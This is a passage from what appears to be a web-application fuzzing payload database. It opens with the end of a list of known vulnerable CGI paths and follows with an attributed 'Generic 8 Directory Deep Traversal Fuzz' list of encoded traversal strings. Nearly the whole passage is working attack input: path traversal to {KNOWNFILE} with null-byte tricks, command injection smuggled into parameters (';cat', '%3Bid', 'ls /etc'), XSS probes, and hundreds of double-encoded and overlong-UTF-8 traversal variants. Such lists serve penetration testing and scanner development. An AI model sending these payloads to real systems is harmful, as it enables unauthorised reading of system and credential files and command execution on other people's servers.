    story/story.pl?next=../../../../../../../../../..{KNOWNFILE}%00
    survey
    survey.cgi
    sws/admin.html
    sws/manager.pl
    tablebuild.pl
    talkback.cgi?article=../../../../../../../..{KNOWNFILE}%00&action=view&matchview=1
    tcsh
    technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../..{KNOWNFILE}
    test-cgi.tcl
    test-cgi?/*
    test-env
    test.cgi
    test/test.cgi
    texis/junk
    texis/phine
    textcounter.pl
    tidfinder.cgi
    tigvote.cgi
    title.cgi
    tpgnrock
    traffic.cgi?cfg=../../../../../../../..{KNOWNFILE}
    troops.cgi
    ttawebtop.cgi/?action=start&pg=../../../../../../../../../..{KNOWNFILE}
    ultraboard.cgi
    ultraboard.pl
    unlg1.1
    unlg1.2
    update.dpgs
    upload.cgi
    uptime
    urlcount.cgi?%3CIMG%20
    ustorekeeper.pl?command=goto&file=../../../../../../../../../..{KNOWNFILE}
    utm/admin
    utm/utm_stat
    view-source
    view-source?view-source
    view_item?HTML_FILE=../../../../../../../../../..{KNOWNFILE}%00
    viewcvs.cgi/viewcvs/?cvsroot=<script>alert('XSS')</script>
    viewcvs.cgi/viewcvs/viewcvs/?sortby=rev\
    viewlogs.pl
    viewsource?{KNOWNFILE}
    viralator.cgi
    virgil.cgi
    vote.cgi
    vpasswd.cgi
    vq/demos/respond.pl?<script>alert('XSS')</script>
    w3-msql
    w3-sql
    wais.pl
    way-board.cgi?db={KNOWNFILE}%00
    way-board/way-board.cgi?db={KNOWNFILE}%00
    webais
    webbbs.cgi
    webbbs/webbbs_config.pl?name=joe&email=test@example.com&body=aaaaffff&followup=10;cat%20{KNOWNFILE}
    webcart/webcart.cgi?CONFIG=mountain&CHANGE=YE
    webdist.cgi?distloc=;cat%20{KNOWNFILE}
    webdriver
    webgais
    webif.cgi
    webmail/html/emumail.cgi?type=/../../../../../../../../../../../../../../../..{KNOWNFILE}%00
    webmap.cgi
    webnews.pl
    webplus?about
    webplus?script=../../../../../../../../../..{KNOWNFILE}
    websendmail
    webspirs.cgi?sp.nextform=../../../../../../../../../..{KNOWNFILE}
    webutil.pl
    webutils.pl
    webwho.pl
    where.pl?sd=ls%20/etc
    whois.cgi?action=load&whois=%3Bid
    whois.cgi?lookup=;&ext=/bin/cat%20{KNOWNFILE}
    whois/whois.cgi?lookup=;&ext=/bin/cat%20{KNOWNFILE}
    whois_raw.cgi?fqdn=%0Acat%20{KNOWNFILE}
    windmail
    wrap
    wrap.cgi
    ws_ftp.ini
    www-sql
    wwwadmin.pl
    wwwboard.cgi.cgi
    wwwboard.pl
    wwwstats.pl
    wwwthreads/3tvars.pm
    wwwthreads/w3tvars.pm
    wwwwais
    zml.cgi?file=../../../../../../../../../..{KNOWNFILE}%00
    zsh

### Generic 8 Directory Deep Traversal Fuzz (17 March 2010 - Total Statements: 879)

    # Generic 8 Directory Deep Traversal Fuzz (17 March 2010)
    # Derived from the awesome "Directory Traversal Fuzzing Code" v0.2 by Luca Carettoni
    # Did some cleanup & removed anything to the right of {FILE} for inclusion in a
    # separate fuzzfile for more flexibiity, for the OWASP Fuzzing Code Database.
    # adam.muntner@uietmove.com

    ../{FILE}
    ../../{FILE}
    ../../../{FILE}
    ../../../../{FILE}
    ../../../../../{FILE}
    ../../../../../../{FILE}
    ../../../../../../../{FILE}
    ../../../../../../../../{FILE}
    ..%2f{FILE}
    ..%2f..%2f{FILE}
    ..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    ..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{FILE}
    %2e%2e/{FILE}
    %2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/{FILE}
    %2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    %2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f{FILE}
    ..%252f{FILE}
    ..%252f..%252f{FILE}
    ..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    ..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f{FILE}
    %252e%252e/{FILE}
    %252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/{FILE}
    %252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    %252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f{FILE}
    ..\{FILE}
    ..\..\{FILE}
    ..\..\..\{FILE}
    ..\..\..\..\{FILE}
    ..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\{FILE}
    ..\..\..\..\..\..\..\..\{FILE}
    ..%255c{FILE}
    ..%255c..%255c{FILE}
    ..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%255c..%255c..%255c..%255c..%255c..%255c..%255c..%255c{FILE}
    ..%5c..%5c{FILE}
    ..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    ..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c{FILE}
    %2e%2e\{FILE}
    %2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\%2e%2e\{FILE}
    %2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
    %252e%252e\{FILE}
    %252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\%252e%252e\{FILE}
    %252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    %252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c{FILE}
    ..%c0%af{FILE}
    ..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
    ..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
    %c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/{FILE}
    %c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af{FILE}
    ..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    ..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af..%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    %25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af%25c0%25ae%25c0%25ae%25c0%25af{FILE}
    ..%c1%9c{FILE}
    ..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
    ..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c{FILE}
    %c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\%c0%ae%c0%ae\{FILE}
    %c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    %c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE}
    ..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    ..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c..%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    %25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c{FILE}
    ..%%32%66{FILE}
    ..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
    ..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66{FILE}
    %%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    %%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66{FILE}
    ..%%35%63{FILE}
    ..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
    ..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63..%%35%63{FILE}
    %%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/{FILE}
    %%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    %%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63{FILE}
    ../{FILE}
    ../../{FILE}
    ../../../{FILE}
    ../../../../{FILE}
    ../../../../../{FILE}
    ../../../../../../{FILE}
    ../../../../../../../{FILE}
    ../../../../../../../../{FILE}
    ..%2f{FILE}
